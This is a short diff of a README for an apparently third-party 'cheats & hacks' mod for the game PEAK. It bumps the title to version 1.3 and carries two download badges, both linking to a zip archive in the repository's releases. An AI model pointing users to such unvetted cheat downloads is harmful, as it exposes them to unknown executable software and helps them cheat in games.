@@ -1,4 +1,4 @@
-# PEAK Mod Menu / Cheat Hack 1.2
+# PEAK Cheats & Hacks Mod - 1.3
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheat-hacks/releases/download/1.3/PEAK.Mod.Build.v1.3.zip)
 [![GitHub release](https://img.shields.io/badge/Release-1.3-blue?style=for-the-badge)](https://github.com/fuseloadercatalog/PEAK-cheat-hacks/releases/download/1.3/PEAK.Mod.Build.v1.3.zip)
